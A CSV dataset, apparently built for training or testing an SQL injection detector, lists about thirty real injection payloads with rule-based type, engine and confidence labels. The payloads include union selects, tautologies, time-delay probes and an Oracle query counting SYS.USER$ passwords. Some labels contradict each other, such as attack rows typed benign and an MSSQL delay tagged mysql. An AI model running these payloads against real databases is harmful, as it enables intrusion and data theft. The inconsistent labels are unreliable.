row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
720,"union ( select NULL, NULL, NULL, ( select @@version ) ) --",1,,union_based,mysql,0.95,union ( select detected — union_based injection (priority 7) on mysql,rule-based
721,"select * from users where id = 1 union select @ $$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
722,"select * from users where id = 1 or ""@#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
723,"1 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
724,"select * from users where id = 1 union select 1<@.,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
725,"select * from users where id = 1 or 1#""@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
726,"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
727,"select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
728,"admin"" ) or ""1"" = ""1""/*",1,,boolean_blind,generic,0.95,"or ""1"" = ""1"" detected — boolean_blind injection (priority 8) on generic",rule-based
729,""" or ""a"" = ""a",1,,boolean_blind,generic,0.85,"or ""a"" = ""a detected — boolean_blind injection (priority 8) on generic",rule-based
730,"select * from users where id = 1 or 1#""$ union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
731,"benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
732,exec xp,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
733,"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
734,"select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
735,hi' or 'a' = 'a,1,,boolean_blind,generic,0.85,or 'a' = 'a detected — boolean_blind injection (priority 8) on generic,rule-based
736,or ''*',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
737,sqlattempt1,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
738,admin' or 1 = 1--,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
739,"select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
740,1' or '1' = '1,1,,boolean_blind,generic,0.85,or '1' = '1 detected — boolean_blind injection (priority 8) on generic,rule-based
741,"select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
742,",@variable",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
743,*|,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
744,"select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
745,* ( | ( mail = * ) ),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
746,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 8 ) waitfor delay '0:0:2' --",1,,time_blind,mysql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
747,"select * from users where id = 1 or 1#"", union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
748,"select * from users where id = 1 or 1#""1 union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
749,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( PASSWORD ) ) FROM SYS.USER$ ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
